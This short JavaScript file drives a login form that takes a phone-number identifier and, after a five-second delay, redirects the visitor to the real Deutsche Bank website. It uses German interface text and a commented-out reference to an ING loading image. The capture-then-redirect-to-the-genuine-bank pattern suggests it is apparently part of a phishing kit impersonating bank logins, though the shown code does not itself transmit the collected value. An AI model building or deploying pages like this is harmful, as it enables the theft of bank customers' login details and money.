const login_form = document.querySelector('#login-form');

const identification = document.querySelector('#phone');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (identification.value === '') {
        loginButton.innerHTML = 'Beenden';
        loginButton.disabled = false;

        identification.disabled = false;

        identification.value = '';

        document.querySelector('#errorMessage').style.display = 'block';
    } else {
        const data = new FormData();
        data.append('identification', identification.value);

        // loginButton.innerHTML = '<img src="images/ing.gif" width="18"> Laden...';
        loginButton.disabled = true;
        setTimeout(() => {
            window.location.href = 'https://www.deutsche-bank.de/pk.html';
        }, 5000);

    }
});
